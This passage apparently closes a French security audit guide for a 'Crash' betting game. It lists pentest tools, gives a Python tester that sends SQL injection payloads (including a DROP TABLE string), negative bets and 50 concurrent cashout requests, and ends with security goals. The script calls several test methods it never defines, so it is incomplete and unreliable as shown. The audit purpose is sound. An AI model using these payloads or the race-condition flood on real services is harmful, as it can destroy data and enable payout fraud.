    gobuster \
    wireshark \
    burpsuite \
    metasploit-framework \
    hydra \
    john \
    aircrack-ng

# Outils Python
pip install \
    requests \
    websocket-client \
    scapy \
    impacket \
    numpy \
    scipy

# Outils Node.js
npm install -g \
    wscat \
    artillery \
    loadtest
```

### Scripts d'automatisation
```python
# test_suite.py - Suite de tests automatisée

import requests
import json
import time
from typing import List, Dict

class CrashGameSecurityTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities = []

    def run_all_tests(self):
        """Exécute tous les tests de sécurité"""
        print("[*] Démarrage de la suite de tests de sécurité")

        tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_negative_bet,
            self.test_race_condition,
            self.test_replay_attack,
            self.test_timing_attack,
            self.test_rng_prediction,
            self.test_excessive_bet,
            self.test_late_cashout
        ]

        for test in tests:
            try:
                print(f"\n[*] Exécution: {test.__name__}")
                result = test()
                if result['vulnerable']:
                    self.vulnerabilities.append(result)
                    print(f"[!] VULNÉRABILITÉ TROUVÉE: {result['description']}")
                else:
                    print(f"[✓] Test passé: {result['description']}")
            except Exception as e:
                print(f"[!] Erreur lors du test {test.__name__}: {e}")

        self.generate_report()

    def test_sql_injection(self) -> Dict:
        """Test d'injection SQL"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE bets; --",
            "' UNION SELECT * FROM users --"
        ]

        for payload in payloads:
            response = self.session.post(
                f"{self.base_url}/api/bet",
                json={"user_id": payload, "amount": 100}
            )

            if response.status_code == 500 or "error" in response.text.lower():
                return {
                    'vulnerable': True,
                    'type': 'SQL_INJECTION',
                    'severity': 'CRITICAL',
                    'description': 'Injection SQL possible',
                    'payload': payload
                }

        return {'vulnerable': False, 'description': 'Pas d\'injection SQL détectée'}

    def test_negative_bet(self) -> Dict:
        """Test de pari négatif"""
        response = self.session.post(
            f"{self.base_url}/api/bet",
            json={"amount": -1000, "round_id": "test"}
        )

        if response.status_code == 200:
            return {
                'vulnerable': True,
                'type': 'NEGATIVE_BET',
                'severity': 'CRITICAL',
                'description': 'Paris négatifs acceptés'
            }

        return {'vulnerable': False, 'description': 'Paris négatifs correctement rejetés'}

    def test_race_condition(self) -> Dict:
        """Test de race condition sur cashout"""
        import concurrent.futures

        bet_id = "test_bet_123"

        def attempt_cashout():
            return self.session.post(
                f"{self.base_url}/api/cashout",
                json={"bet_id": bet_id, "multiplier": 2.5}
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(attempt_cashout) for _ in range(50)]
            results = [f.result() for f in futures]

        successful = [r for r in results if r.status_code == 200]

        if len(successful) > 1:
            return {
                'vulnerable': True,
                'type': 'RACE_CONDITION',
                'severity': 'CRITICAL',
                'description': f'{len(successful)} cashouts simultanés réussis',
                'successful_count': len(successful)
            }

        return {'vulnerable': False, 'description': 'Pas de race condition détectée'}

    def generate_report(self):
        """Génère le rapport d'audit"""
        print("\n" + "="*60)
        print("RAPPORT D'AUDIT DE SÉCURITÉ")
        print("="*60)

        if not self.vulnerabilities:
            print("\n[✓] Aucune vulnérabilité critique trouvée")
            return

        print(f"\n[!] {len(self.vulnerabilities)} vulnérabilités trouvées:\n")

        for vuln in sorted(self.vulnerabilities, key=lambda x: x['severity'], reverse=True):
            print(f"[{vuln['severity']}] {vuln['type']}")
            print(f"    Description: {vuln['description']}")
            if 'payload' in vuln:
                print(f"    Payload: {vuln['payload']}")
            print()

if __name__ == "__main__":
    tester = CrashGameSecurityTester("https://api.example.com")
    tester.run_all_tests()
```

---

## CONCLUSION

Cet audit de sécurité couvre tous les aspects critiques du jeu Crash. L'objectif est de garantir que:

1. ✅ **Le RNG est imprévisible** - Utilisation de CSPRNG avec système Provably Fair
2. ✅ **Aucune manipulation n'est possible** - Validation stricte côté serveur
3. ✅ **Les transactions sont atomiques** - Transactions ACID avec locks
4. ✅ **L'API est sécurisée** - Rate limiting, validation, authentication
5. ✅ **Le code client est protégé** - Obfuscation, SRI, CSP
6. ✅ **Le système est monitoré** - Détection d'activités suspectes 24/7

**IMPORTANT**: Ce document est un guide complet. Chaque test doit être exécuté méthodiquement et documenté. Les vulnérabilités trouvées doivent être corrigées AVANT la mise en production.

---

**Contact**: Pour toute question sur cet audit, contactez l'équipe de sécurité.

**Version**: 1.0
**Dernière mise à jour**: 24 Novembre 2025
